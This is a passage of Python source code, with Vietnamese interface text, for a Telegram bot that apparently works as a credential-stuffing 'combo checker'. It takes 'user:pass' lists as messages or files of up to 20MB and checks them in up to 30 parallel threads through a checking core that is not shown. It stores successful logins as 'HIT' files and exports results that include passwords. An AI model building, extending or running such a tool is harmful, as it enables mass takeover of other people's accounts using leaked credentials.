        f"{E('note')} Telegram chỉ cho bot dùng custom emoji khi bot có username "
        f"mua trên Fragment. Bot thường bị từ chối → bot tự lùi về emoji chuẩn, "
        f"không bao giờ chết vì icon.\n\n"
        f"Muốn thêm icon riêng: tạo <code>data/premium_emoji.json</code>:\n"
        f"<code>{{\"fire\": [\"🔥\", \"5291789094702030262\"]}}</code>"
    )


# --------------------------------------------------------------- dispatch ----
def handle_text(msg: dict) -> None:
    chat_id = msg["chat"]["id"]
    text = (msg.get("text") or "").strip()
    reply_to = msg.get("message_id")

    if text.startswith("/"):
        cmd, _, arg = text.partition(" ")
        cmd = cmd.split("@")[0].lower()
        arg = arg.strip()
        if cmd in ("/start", "/menu"):
            send(chat_id, menu_text(), keyboard=menu_kb(), reply_to=reply_to)
        elif cmd in ("/help",):
            send(chat_id, help_text(), reply_to=reply_to)
        elif cmd in ("/stats",):
            send(chat_id, stats_text())
        elif cmd in ("/premium",):
            PREMIUM["on"] = not PREMIUM["on"]
            send(chat_id, premium_text(), reply_to=reply_to)
        elif cmd in ("/stop",):
            with JOBS_LOCK:
                j = JOBS.get(chat_id)
            if j and j.get("running"):
                j["stop"] = True
                send(chat_id, f"{E('stop')} Đang dừng job…", reply_to=reply_to)
            else:
                send(chat_id, "Không có job nào đang chạy.", reply_to=reply_to)
        elif cmd in ("/threads",):
            global THREADS
            if arg.isdigit() and 1 <= int(arg) <= 30:
                THREADS = int(arg)
                send(chat_id, f"{E('ok')} Luồng = <b>{THREADS}</b>", reply_to=reply_to)
            else:
                send(chat_id, f"Luồng hiện tại: <b>{THREADS}</b>\nĐổi: <code>/threads 8</code> (1–30)",
                     reply_to=reply_to)
        elif cmd in ("/export",):
            files = sorted(RESULT_DIR.glob("hit_*.txt"))
            if not files:
                send(chat_id, "Chưa có file HIT nào.", reply_to=reply_to)
            else:
                send_doc(chat_id, files[-1], caption=f"{E('file')} {esc(files[-1].name)}")
        elif cmd in ("/id",):
            send(chat_id, f"{E('id')} chat_id: <code>{chat_id}</code>", reply_to=reply_to)
        else:
            send(chat_id, f"Không rõ lệnh <code>{esc(cmd)}</code>. Gửi /help.", reply_to=reply_to)
        return

    combos = parse_combos(text)
    if not combos:
        send(chat_id, f"{E('warn')} Không thấy acc nào.\nGửi mỗi dòng 1 acc dạng <code>user:pass</code>, "
                      f"hoặc gửi file .txt.", reply_to=reply_to)
        return
    if len(combos) > MAX_PER_MSG:
        combos = combos[:MAX_PER_MSG]
        send(chat_id, f"{E('warn')} Chỉ nhận {MAX_PER_MSG} acc/tin đầu tiên. "
                      f"Nhiều hơn thì gửi file .txt cho bot.", reply_to=reply_to)
    start_job(chat_id, combos, reply_to=reply_to)


def handle_document(msg: dict) -> None:
    chat_id = msg["chat"]["id"]
    doc = msg.get("document") or {}
    name = doc.get("file_name") or "combo.txt"
    size = int(doc.get("file_size") or 0)
    if size > 20 * 1024 * 1024:
        send(chat_id, f"{E('no')} File lớn quá (giới hạn 20MB). Chia nhỏ giúp mình.")
        return
    dest = TMP_DIR / f"{uuid_hex()}_{re.sub(r'[^A-Za-z0-9._-]', '_', name)}"
    send(chat_id, f"{E('file')} Đang tải <b>{esc(name)}</b>…")
    if not download_file(doc.get("file_id", ""), dest):
        send(chat_id, f"{E('no')} Tải file lỗi. Gửi lại giúp mình.")
        return
    try:
        raw = dest.read_text(encoding="utf-8", errors="ignore")
    except Exception as exc:
        send(chat_id, f"{E('no')} Đọc file lỗi: {esc(exc)}")
        return
    combos = parse_combos(raw)
    if not combos:
        send(chat_id, f"{E('no')} File không có dòng nào dạng <code>user:pass</code>.")
        return
    send(chat_id, f"{E('ok')} Đọc được <b>{len(combos)}</b> acc — bắt đầu check.")
    start_job(chat_id, combos)


def handle_callback(cb: dict) -> None:
    data = cb.get("data") or ""
    chat_id = (cb.get("message") or {}).get("chat", {}).get("id")
    cb_id = cb.get("id")
    if not chat_id:
        return
    if data == "help":
        answer_cb(cb_id)
        edit(chat_id, cb["message"]["message_id"], help_text(),
             keyboard=[[{"text": "🏠 Menu", "callback_data": "menu"}]])
    elif data == "stats":
        answer_cb(cb_id)
        edit(chat_id, cb["message"]["message_id"], stats_text(),
             keyboard=[[{"text": "🏠 Menu", "callback_data": "menu"}]])
    elif data == "premium":
        PREMIUM["on"] = not PREMIUM["on"]
        answer_cb(cb_id, "Đã bật icon premium" if PREMIUM["on"] else "Đã tắt, dùng emoji chuẩn")
        edit(chat_id, cb["message"]["message_id"], premium_text(),
             keyboard=[[{"text": "🏠 Menu", "callback_data": "menu"}]])
    elif data == "menu":
        answer_cb(cb_id)
        edit(chat_id, cb["message"]["message_id"], menu_text(), keyboard=menu_kb())
    elif data == "export":
        files = sorted(RESULT_DIR.glob("hit_*.txt"))
        answer_cb(cb_id)
        if files:
            send_doc(chat_id, files[-1], caption=f"{E('file')} {esc(files[-1].name)}")
        else:
            send(chat_id, "Chưa có file HIT nào.")
    elif data.startswith("json:"):
        rid = data.split(":", 1)[1]
        with RES_LOCK:
            r = RES_STORE.get(rid)
        if not r:
            answer_cb(cb_id, "Kết quả đã hết hạn, check lại giúp mình", alert=True)
            return
        answer_cb(cb_id, "Đang xuất JSON…")
        path = TMP_DIR / f"json_{rid}.json"
        path.write_text(dump_json(r), encoding="utf-8")
        send_doc(chat_id, path, caption=f"{E('file')} <b>JSON đầy đủ</b> — {esc(r.get('account'))}")
    elif data.startswith("re:"):
        rid = data.split(":", 1)[1]
        with RES_LOCK:
            r = RES_STORE.get(rid)
        if not r:
            answer_cb(cb_id, "Kết quả đã hết hạn, gửi lại acc giúp mình", alert=True)
            return
        answer_cb(cb_id, "Check lại…")
        start_job(chat_id, [(r.get("account", ""), r.get("password", ""))])
    else:
        answer_cb(cb_id)


# ------------------------------------------------------------------- loop ----
def get_updates(offset: int | None, timeout: int = 25) -> dict:
    payload = {"timeout": timeout, "allowed_updates": ["message", "callback_query"]}
    if offset:
        payload["offset"] = offset
    return api("getUpdates", payload, timeout=timeout + 15)


PID_FILE = DATA / "bot.pid"


def write_pid() -> None:
    try:
        PID_FILE.write_text(str(os.getpid()), encoding="utf-8")
    except Exception:
        pass


def clear_pid() -> None:
    try:
        if PID_FILE.exists() and PID_FILE.read_text(encoding="utf-8").strip() == str(os.getpid()):
            PID_FILE.unlink()
    except Exception:
        pass


def main() -> None:
    write_pid()
    import atexit
    atexit.register(clear_pid)
    me = api("getMe")
    if not me.get("ok"):
        print("=" * 66)
        print("  TOKEN KHÔNG DÙNG ĐƯỢC:", me.get("description"))
        print("  Kiểm tra lại BOT_TOKEN trong config.env")
        print("=" * 66)
        input("\n  Nhấn Enter để thoát...")
        sys.exit(1)
    uname = (me.get("result") or {}).get("username", "?")
    log(f"Bot @{uname} đã lên. Đang nghe tin nhắn…")
    get_core()

    core = get_core()
    if core is None:
        log("CẢNH BÁO: lõi check chưa nạp được.")
    try:
        for admin in ADMINS:
            send(admin, f"{E('rocket')} Bot <b>@{esc(uname)}</b> vừa online.\n"
                        f"{E('ok') if core else E('no')} Lõi check: "
                        f"{'OK' if core else esc(CORE_ERR)}")
    except Exception:
        pass

    offset = None
    while True:
        try:
            upd = get_updates(offset)
            if not upd.get("ok"):
                desc = str(upd.get("description") or "")
                log("getUpdates lỗi:", desc[:120])
                time.sleep(3)
                continue
            for u in upd.get("result") or []:
                offset = u["update_id"] + 1
                try:
                    if "message" in u:
                        m = u["message"]
                        if m.get("document"):
                            threading.Thread(target=handle_document, args=(m,), daemon=True).start()
                        elif m.get("text"):
                            threading.Thread(target=handle_text, args=(m,), daemon=True).start()
                    elif "callback_query" in u:
                        handle_callback(u["callback_query"])
                except Exception:
                    log("xử lý update lỗi:\n" + traceback.format_exc()[:500])
        except KeyboardInterrupt:
            log("Dừng bot.")
            break
        except Exception:
            log("vòng lặp lỗi:\n" + traceback.format_exc()[:400])
            time.sleep(2)


if __name__ == "__main__":
    main()
